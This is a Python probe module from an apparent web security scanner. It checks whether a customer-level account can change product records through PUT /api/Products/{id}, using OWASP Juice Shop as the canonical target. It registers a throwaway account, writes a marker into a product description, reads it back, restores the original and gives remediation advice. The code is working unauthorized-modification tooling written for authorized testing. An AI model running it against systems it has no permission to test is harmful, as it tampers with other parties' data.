#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Vertical authorization + mass-assignment combo on the product
catalog update endpoint: a low-privilege customer can PUT
/api/Products/{id} and modify privilege-bearing fields like `price`,
`name`, and `description` that should be gated behind a product-
management role.

The OWASP Juice Shop /api/Products/{id} update is the canonical case.
The endpoint accepts a customer JWT and persists whatever the body
specifies, including a negative `price`. We probe this with a small,
reversible mutation -- append a synthetic suffix to `description` on
the FIRST product, capture the response, then PUT the original
description back. If the round-trip succeeds AND the body comes back
with our injected suffix, the bug is confirmed; the data is restored
on the SAME call so we leave the catalog as we found it.

Safety: we only mutate the description (a free-text field). We do not
touch `price` or any field that affects downstream business logic
even when the bug exists, and we restore the original value
immediately. If the restore PUT fails for any reason, that
information is captured in the verdict for the analyst to clean up
manually -- the product will have a 'nextgen-dast-probe' suffix on
its description, which is obviously diagnostic and not destructive.
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

UPDATE_PATH_TEMPLATES = (
    "/api/Products/{pid}",
    "/api/products/{pid}",
    "/rest/products/{pid}",
)
LIST_PATHS = ("/api/Products", "/api/products", "/rest/products")


def _register_login(client: SafeClient, origin: str) -> tuple[str | None, dict]:
    email = f"pricema-{secrets.token_hex(6)}@dast.test"
    pw = "Pr0be-" + secrets.token_hex(4)
    diag = {"email": email}
    client.request(
        "POST", urljoin(origin, "/api/Users"),
        headers={"Content-Type": "application/json"},
        body=json.dumps({
            "email": email, "password": pw, "passwordRepeat": pw,
            "securityQuestion": {"id": 1},
            "securityAnswer": "probe",
        }).encode())
    r = client.request(
        "POST", urljoin(origin, "/rest/user/login"),
        headers={"Content-Type": "application/json"},
        body=json.dumps({"email": email, "password": pw}).encode())
    diag["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            tok = (doc.get("authentication") or {}).get("token")
            if tok:
                return tok, diag
        except json.JSONDecodeError:
            pass
    return None, diag


def _first_product(client: SafeClient, origin: str, token: str) -> dict | None:
    for path in LIST_PATHS:
        r = client.request("GET", urljoin(origin, path),
                           headers={"Authorization": f"Bearer {token}"})
        if r.status != 200 or not r.body:
            continue
        try:
            doc = json.loads(r.text)
        except json.JSONDecodeError:
            continue
        rows = doc.get("data") if isinstance(doc, dict) else doc
        if isinstance(rows, list):
            for row in rows:
                if (isinstance(row, dict) and isinstance(row.get("id"), int)
                        and "description" in row):
                    return row
    return None


class AuthzProductPriceMassAssignmentProbe(Probe):
    name = "authz_product_price_mass_assignment"
    summary = ("Detects customer-level PUT /api/Products/{id} accepting "
               "mutations to privilege-bearing fields (price, name, "
               "description) that should require an admin role.")
    safety_class = "probe"

    def add_args(self, parser):
        pass

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        token, diag = _register_login(client, origin)
        if not token:
            return Verdict(
                validated=None, confidence=0.5, ok=True,
                summary=(f"Inconclusive: could not establish a probe "
                         f"session on {origin}."),
                evidence={"origin": origin, "session": diag},
            )

        product = _first_product(client, origin, token)
        if not product:
            return Verdict(
                validated=False, confidence=0.7,
                summary=(f"Inconclusive: could not enumerate a product "
                         f"on {origin} (no candidate list endpoint "
                         "returned a product with an integer id)."),
                evidence={"origin": origin, "session_email": diag.get("email")},
            )

        pid = product["id"]
        original_desc = product.get("description") or ""
        marker = f"nextgen-dast-probe-{secrets.token_hex(4)}"
        injected_desc = f"{original_desc} {marker}"

        attempts: list[dict] = []
        confirmed: dict | None = None
        for tmpl in UPDATE_PATH_TEMPLATES:
            path = tmpl.format(pid=pid)
            url = urljoin(origin, path)
            # Tamper round-trip:
            payload = json.dumps({"description": injected_desc}).encode()
            r = client.request("PUT", url, headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }, body=payload)
            row = {"path": path, "method": "PUT",
                   "status": r.status, "size": r.size}
            # Read-back to verify persistence (the response body of the
            # PUT may already include the new value; we also issue a
            # follow-up GET to be unambiguous).
            body_text = (r.text or "")
            put_echoed_marker = marker in body_text
            r_get = client.request("GET", url, headers={
                "Authorization": f"Bearer {token}"})
            get_text = (r_get.text or "")
            get_has_marker = marker in get_text
            row["put_echoed_marker"] = put_echoed_marker
            row["get_status"] = r_get.status
            row["get_has_marker"] = get_has_marker
            # Always attempt the restore step so the catalog is left
            # clean. Skip if we never wrote.
            if put_echoed_marker or get_has_marker:
                restore = client.request("PUT", url, headers={
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json",
                }, body=json.dumps(
                    {"description": original_desc}).encode())
                row["restore_status"] = restore.status
                # Confirmed: the customer-level token persisted a
                # description change on a product they don't own.
                confirmed = row
                attempts.append(row)
                break
            attempts.append(row)

        evidence = {"origin": origin, "session_email": diag.get("email"),
                    "product_id": pid, "marker": marker,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.94,
                summary=(
                    f"Confirmed: PUT {origin}{confirmed['path']} accepted "
                    f"a customer-level JWT and persisted a description "
                    f"mutation on product id {pid}. The marker "
                    f"`{marker}` was observed in the "
                    f"{('PUT response body' if confirmed['put_echoed_marker'] else 'follow-up GET body')} "
                    "before restore. This is a vertical authorization "
                    "failure on the catalog-update endpoint; the same "
                    "code path almost certainly permits mutations to "
                    "`price` and `name` (the more financially relevant "
                    "fields the probe deliberately did not touch)."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Gate PUT /api/Products/{id} on an explicit product-"
                    "management role. In Express:\n"
                    "  app.put('/api/Products/:id', "
                    "requireRole('product_admin'), ...)\n"
                    "Apply a field-level allowlist in the controller "
                    "BEFORE persisting -- only fields explicitly listed "
                    "(e.g., empty for customer, full set for admin) "
                    "should be applied to the model, so future code "
                    "changes that add new fields don't silently expose "
                    "them. Reject negative or otherwise out-of-band "
                    "price values regardless of caller role."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} product-update "
                     f"path(s) on {origin}; none persisted a customer-"
                     "supplied description mutation."),
            evidence=evidence,
        )


if __name__ == "__main__":
    AuthzProductPriceMassAssignmentProbe().main()
